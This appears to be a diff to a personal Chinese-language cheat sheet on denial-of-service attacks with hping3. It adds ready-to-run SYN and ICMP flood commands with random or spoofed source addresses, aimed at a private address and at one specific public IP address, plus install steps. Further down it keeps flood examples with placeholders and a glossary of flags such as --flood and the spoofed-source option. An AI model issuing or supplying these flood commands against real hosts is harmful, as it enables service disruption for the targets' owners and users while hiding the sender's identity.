@@ -1,5 +1,13 @@
 # DoS***方法（hping3）
 
+hping3 -i ul -S -p 80 192.168.0.23
+hping3 -S -p 80 --flood --rand-source 192.168.0.23
+hping3 -i ul -S -p 80 192.168.0.23
+hping3 -S -p 21 --flood --rand-source 211.75.237.90
+hping3 -c 100 -d 128 -S -w 64 -p 21 --flood --rand-source 211.75.237.90
+hping3 -a 211.75.237.89 -1 -p 80 --flood 211.75.237.90
+
+
 ```
 root@kali:~# hping3 -h
 usage: hping3 host [options]
@@ -187,6 +195,12 @@ ARS数据包描述(新增加的内容，暂时还不稳定)
 ```
 
 
+## install
+```
+yum install -y yum-plugin-priorities
+yum install -y hping3
+
+```
 
 ## example
 
@@ -212,8 +226,8 @@ hping3  -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite
 
 hping3  192.168.0.21 –i u10000  –S  –a 1.2.3.4
 hping3 want_ping_ip --fast -p 80 -S  --rand-source
-hping want_ping_ip –i u100000 –S –a 211.75.237.89 
-hping3 -q -n -a 211.75.237.89 -S -s 53 --keep -p 22 --flood want_ping_ip
+hping want_ping_ip –i u100000 –S –a 1.2.3.4 
+hping3 -q -n -a want_ping_ip -S -s 53 --keep -p 22 --flood want_ping_ip
 
 [ -c count ]  [ -d data size ] [ -s source port ] [ -w tcp window ] [ -p desk port ] [ -a 偽造來源IP ]
 -- flood    洪水 盡可能快地發送數據包，而不必注意顯示傳入的回复。
